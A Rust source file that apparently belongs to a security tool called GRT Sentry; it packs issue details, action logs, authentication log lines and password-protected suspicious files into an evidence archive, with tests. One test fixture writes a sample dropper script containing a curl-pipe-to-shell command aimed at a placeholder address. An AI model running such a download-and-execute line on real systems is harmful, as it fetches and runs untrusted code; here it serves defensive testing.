//! An archive that keeps a problem as evidence: what was found, the files it
//! is about, what GRT Sentry did, and the log lines that mention it.
//!
//! The suspicious files go in encrypted with the password `infected`, the
//! convention for passing samples on, so no antivirus deletes the archive on
//! the way and nobody opens a sample by mistake. Every entry has the same date
//! and permissions, as in the other GRT formats, so the archive says nothing
//! about the machine beyond what is written in it.

use std::fs::File;
use std::io::{Read, Write};
use std::path::Path;

use md5::Md5;
use rusqlite::Connection;
use sha2::{Digest, Sha256};
use zip::unstable::write::FileOptionsExt;
use zip::write::SimpleFileOptions;
use zip::{CompressionMethod, DateTime, ZipWriter};

use crate::db::{self, QuarantineEntry};
use crate::platform::{self, LogAccess};
use crate::report::local_time;
use crate::state::{Issue, IssueTarget};
use crate::{actionlog, quarantine};

pub const PASSWORD: &str = "infected";

/// The largest sample put in one archive.
const MAX_SAMPLE: u64 = 64 * 1024 * 1024;
/// Log lines kept about one address.
const MAX_LOG_LINES: usize = 2000;

/// A file to put in, and whether it is a sample.
struct Entry {
    name: String,
    bytes: Vec<u8>,
    sample: bool,
}

/// A sample, with where it was.
struct Sample {
    origin: String,
    bytes: Vec<u8>,
}

impl Sample {
    fn name(&self) -> String {
        format!("files/{}", hex(&Sha256::digest(&self.bytes)))
    }

    fn line(&self) -> String {
        format!(
            "{}\n  was {}\n  {} bytes, SHA-256 {}, MD5 {}",
            self.name(),
            self.origin,
            self.bytes.len(),
            hex(&Sha256::digest(&self.bytes)),
            hex(&Md5::digest(&self.bytes))
        )
    }
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

/// Up to `MAX_SAMPLE` bytes of a file, if it can be read.
fn read_sample(path: &Path) -> Option<Vec<u8>> {
    let file = File::open(path).ok()?;
    if file.metadata().ok()?.len() > MAX_SAMPLE {
        return None;
    }
    let mut bytes = Vec::new();
    file.take(MAX_SAMPLE).read_to_end(&mut bytes).ok()?;
    Some(bytes)
}

fn quarantined_sample(entry: &QuarantineEntry) -> Option<Sample> {
    let bytes = quarantine::with_readable(entry, read_sample).ok().flatten()?;
    Some(Sample { origin: format!("{} (quarantined {})", entry.original_path, local_time(entry.quarantined_at)), bytes })
}

/// What an issue is about, as words to look for in the logs.
fn keys(issue: &Issue, target: &IssueTarget) -> Vec<String> {
    match target {
        IssueTarget::File { path, sha256 } => vec![path.clone(), sha256.clone()],
        IssueTarget::Connection { ip, .. } | IssueTarget::LoginAttempts { ip, .. } => vec![ip.clone()],
        IssueTarget::Integrity { path, .. } | IssueTarget::Package { path, .. } => vec![path.clone()],
        IssueTarget::Process { name, .. } => vec![name.clone()],
        IssueTarget::Baseline { key, .. } => vec![key.clone()],
        IssueTarget::Autostart { key, name } => vec![key.clone(), name.clone()],
        IssueTarget::Packages { names } | IssueTarget::BlockProposal { ips: names } => names.clone(),
        IssueTarget::Informational => vec![issue.location.clone()],
    }
    .into_iter()
    .filter(|k| k.len() >= 3)
    .collect()
}

fn samples_for(conn: &Connection, target: &IssueTarget) -> Vec<Sample> {
    let mut samples = Vec::new();
    match target {
        IssueTarget::File { path, sha256 } => {
            for entry in db::list_quarantine(conn).unwrap_or_default() {
                if &entry.original_path == path || &entry.sha256 == sha256 {
                    samples.extend(quarantined_sample(&entry));
                }
            }
            // Only the bytes the scan saw: a file swapped since, or a link put
            // in its place, could be something private.
            if samples.is_empty() {
                let small = std::fs::metadata(path).is_ok_and(|m| m.len() <= MAX_SAMPLE);
                if let Some(bytes) = small.then(|| crate::scanner::read_as_scanned(Path::new(path), sha256).ok()).flatten() {
                    samples.push(Sample { origin: path.clone(), bytes });
                }
            }
        }
        IssueTarget::Integrity { path, .. } | IssueTarget::Package { path, .. } => {
            if let Some(bytes) = read_sample(Path::new(path)) {
                samples.push(Sample { origin: path.clone(), bytes });
            }
        }
        // A program that deleted its own file can still be read through the
        // process, which is the only copy left.
        IssueTarget::Process { pid, name } => {
            if platform::process_name(*pid).is_some_and(|current| &current == name) {
                if let Some(bytes) = read_sample(&platform::process_executable(*pid)) {
                    samples.push(Sample { origin: format!("the program run by {name} (pid {pid})"), bytes });
                }
            }
        }
        _ => {}
    }
    samples
}

fn action_lines(conn: &Connection, keys: &[String]) -> String {
    let lines: Vec<String> = actionlog::list(conn, 5000)
        .unwrap_or_default()
        .into_iter()
        .filter(|record| keys.iter().any(|k| record.target.contains(k.as_str())))
        .map(|record| {
            let reason = record.reason.as_deref().map(|r| format!(" ({r})")).unwrap_or_default();
            let undone = if record.reverted { ", undone" } else { "" };
            format!("{}  {}{reason}{undone}", local_time(record.timestamp), actionlog::describe(&record))
        })
        .collect();
    if lines.is_empty() {
        "GRT Sentry has done nothing about this.\n".to_string()
    } else {
        lines.join("\n") + "\n"
    }
}

/// The authentication log lines that mention an address.
fn log_lines(target: &IssueTarget, auth_log: &str) -> Option<String> {
    let (IssueTarget::Connection { ip, .. } | IssueTarget::LoginAttempts { ip, .. }) = target else { return None };
    let text = match platform::read_auth_log(auth_log) {
        LogAccess::Ok(text) => Some(text),
        _ => match platform::journal_auth() {
            LogAccess::Ok(text) => Some(text),
            _ => None,
        },
    };
    Some(match text {
        Some(text) => {
            let lines: Vec<&str> = text.lines().filter(|l| l.contains(ip.as_str())).collect();
            let start = lines.len().saturating_sub(MAX_LOG_LINES);
            if lines.is_empty() {
                format!("The authentication log does not mention {ip}.\n")
            } else {
                lines[start..].join("\n") + "\n"
            }
        }
        None => "The authentication log could not be read without administrator rights.\n".to_string(),
    })
}

fn describe_issue(issue: &Issue) -> String {
    let mut text = format!(
        "{}\n{}\n\nSeverity: {:?}\nKind: {}\n",
        issue.title,
        issue.location,
        issue.severity,
        crate::history::kind_name(issue)
    );
    if issue.first_seen > 0 {
        text.push_str(&format!("First seen: {}, in {} scans\n", local_time(issue.first_seen), issue.times_seen));
    }
    if let Some(detail) = &issue.detail {
        text.push_str(&format!("\n{detail}\n"));
    }
    text
}

fn readme(samples: &[Sample], has_log: bool) -> String {
    let mut text = format!(
        "Evidence exported by GRT Sentry {} on {}.\n\n\
         issue.txt    what was found\n\
         actions.txt  what GRT Sentry did about it\n",
        env!("CARGO_PKG_VERSION"),
        local_time(db::now())
    );
    if has_log {
        text.push_str("log.txt      the authentication log lines that mention it\n");
    }
    if samples.is_empty() {
        text.push_str("\nNo file goes with this problem, or none could be read.\n");
    } else {
        text.push_str(&format!(
            "files/       the suspicious files, encrypted with the password {PASSWORD}\n\n\
             The password is the usual one for samples: it keeps an antivirus from deleting the archive \
             on the way and keeps anyone from opening a sample by mistake. Do not run them.\n\n"
        ));
        for sample in samples {
            text.push_str(&sample.line());
            text.push('\n');
        }
    }
    text
}

fn write_zip(path: &Path, entries: Vec<Entry>) -> Result<(), String> {
    let file = File::create(path).map_err(|e| format!("Cannot write {}: {e}", path.display()))?;
    let mut zip = ZipWriter::new(file);
    let plain = SimpleFileOptions::default()
        .compression_method(CompressionMethod::Deflated)
        .last_modified_time(DateTime::default())
        .unix_permissions(0o644);
    for entry in entries {
        let options = if entry.sample {
            plain.with_deprecated_encryption(PASSWORD.as_bytes()).map_err(|e| e.to_string())?
        } else {
            plain
        };
        zip.start_file(entry.name, options).map_err(|e| e.to_string())?;
        zip.write_all(&entry.bytes).map_err(|e| e.to_string())?;
    }
    zip.finish().map_err(|e| e.to_string())?;
    Ok(())
}

fn finish(conn: &Connection, path: &Path, mut entries: Vec<Entry>, samples: Vec<Sample>, what: &str) -> Result<String, String> {
    let has_log = entries.iter().any(|e| e.name == "log.txt");
    entries.insert(0, Entry { name: "README.txt".into(), bytes: readme(&samples, has_log).into_bytes(), sample: false });
    let count = samples.len();
    entries.extend(samples.into_iter().map(|s| Entry { name: s.name(), bytes: s.bytes, sample: true }));
    write_zip(path, entries)?;
    actionlog::record(conn, actionlog::kind::EXPORT, &format!("evidence about {what}"), Some(&path.to_string_lossy()), false);
    Ok(match count {
        0 => format!("Saved to {}, with no file.", path.display()),
        1 => format!("Saved to {}, with one file encrypted as {PASSWORD}.", path.display()),
        n => format!("Saved to {}, with {n} files encrypted as {PASSWORD}.", path.display()),
    })
}

/// Evidence about an issue from the current results.
pub fn export_issue(conn: &Connection, issue: &Issue, target: &IssueTarget, auth_log: &str, path: &Path) -> Result<String, String> {
    let keys = keys(issue, target);
    let mut entries = vec![
        Entry { name: "issue.txt".into(), bytes: describe_issue(issue).into_bytes(), sample: false },
        Entry { name: "actions.txt".into(), bytes: action_lines(conn, &keys).into_bytes(), sample: false },
    ];
    if let Some(log) = log_lines(target, auth_log) {
        entries.push(Entry { name: "log.txt".into(), bytes: log.into_bytes(), sample: false });
    }
    let samples = samples_for(conn, target);
    finish(conn, path, entries, samples, &issue.location)
}

/// Evidence about a file in quarantine.
pub fn export_quarantined(conn: &Connection, id: &str, path: &Path) -> Result<String, String> {
    let entry = db::get_quarantine(conn, id)?.ok_or_else(|| "That quarantine entry no longer exists.".to_string())?;
    let about = format!(
        "{}\n\nQuarantined: {}\nReason: {}\nSHA-256 when it went in: {}\n",
        entry.original_path,
        local_time(entry.quarantined_at),
        entry.reason.as_deref().unwrap_or("none recorded"),
        entry.sha256
    );
    let keys = vec![entry.original_path.clone(), entry.sha256.clone()];
    let entries = vec![
        Entry { name: "issue.txt".into(), bytes: about.into_bytes(), sample: false },
        Entry { name: "actions.txt".into(), bytes: action_lines(conn, &keys).into_bytes(), sample: false },
    ];
    let samples: Vec<Sample> = quarantined_sample(&entry).into_iter().collect();
    if samples.is_empty() {
        return Err("The quarantined file could not be read, so there is nothing to export.".to_string());
    }
    finish(conn, path, entries, samples, &entry.original_path)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::state::{IssueKind, Severity};

    fn open(path: &Path) -> zip::ZipArchive<File> {
        zip::ZipArchive::new(File::open(path).unwrap()).unwrap()
    }

    #[test]
    fn a_sample_is_encrypted_and_the_rest_is_readable() {
        let tmp = tempfile::tempdir().unwrap();
        let _env = crate::testenv::isolated_data_dir(&tmp.path().join("data"));
        let victim = tmp.path().join("dropper.sh");
        std::fs::write(&victim, b"#!/bin/sh\ncurl http://203.0.113.9/x | sh\n").unwrap();
        let sha = crate::scanner::hash_file(&victim).unwrap();

        let conn = db::open_memory();
        let target = IssueTarget::File { path: victim.to_string_lossy().into_owned(), sha256: sha.clone() };
        let issue = Issue {
            kind: IssueKind::RuleMatch,
            severity: Severity::Warning,
            title: "A dropper".into(),
            location: victim.to_string_lossy().into_owned(),
            ..Default::default()
        };
        crate::quarantine::quarantine_file(&conn, victim.to_str().unwrap(), "test").unwrap();

        let out = tmp.path().join("evidence.zip");
        let message = export_issue(&conn, &issue, &target, "/nonexistent", &out).unwrap();
        assert!(message.contains("one file"), "{message}");

        let mut archive = open(&out);
        let names: Vec<String> = archive.file_names().filter_map(Result::ok).map(|n| n.to_string()).collect();
        assert!(names.contains(&"README.txt".to_string()) && names.contains(&"issue.txt".to_string()));
        let sample = format!("files/{sha}");
        assert!(names.contains(&sample), "{names:?}");

        {
            let readme = archive.by_name("README.txt").unwrap();
            assert!(!readme.encrypted());
            assert_eq!(readme.last_modified(), Some(DateTime::default()), "no real date in the archive");
        }
        assert!(archive.by_name(&sample).is_err(), "a sample does not open without the password");
        let mut bytes = Vec::new();
        archive.by_name_decrypt(&sample, PASSWORD.as_bytes()).unwrap().read_to_end(&mut bytes).unwrap();
        assert!(bytes.starts_with(b"#!/bin/sh"));

        let mut actions = String::new();
        archive.by_name("actions.txt").unwrap().read_to_string(&mut actions).unwrap();
        assert!(actions.contains("Quarantined"), "{actions}");
    }

    #[test]
    fn an_address_takes_its_log_lines_and_no_file() {
        let tmp = tempfile::tempdir().unwrap();
        let log = tmp.path().join("auth.log");
        std::fs::write(
            &log,
            "Nov  6 10:00:00 host sshd[1]: Failed password for root from 203.0.113.7 port 22 ssh2\n\
             Nov  6 10:00:01 host sshd[2]: Failed password for root from 198.51.100.1 port 22 ssh2\n",
        )
        .unwrap();
        let conn = db::open_memory();
        let target = IssueTarget::LoginAttempts { ip: "203.0.113.7".into(), failures: 1 };
        let issue = Issue { title: "attempts".into(), location: "203.0.113.7".into(), ..Default::default() };

        let out = tmp.path().join("e.zip");
        export_issue(&conn, &issue, &target, log.to_str().unwrap(), &out).unwrap();
        let mut archive = open(&out);
        let mut text = String::new();
        archive.by_name("log.txt").unwrap().read_to_string(&mut text).unwrap();
        assert!(text.contains("203.0.113.7") && !text.contains("198.51.100.1"));
        assert!(!archive.file_names().filter_map(Result::ok).any(|n| n.starts_with("files/")));
    }
}
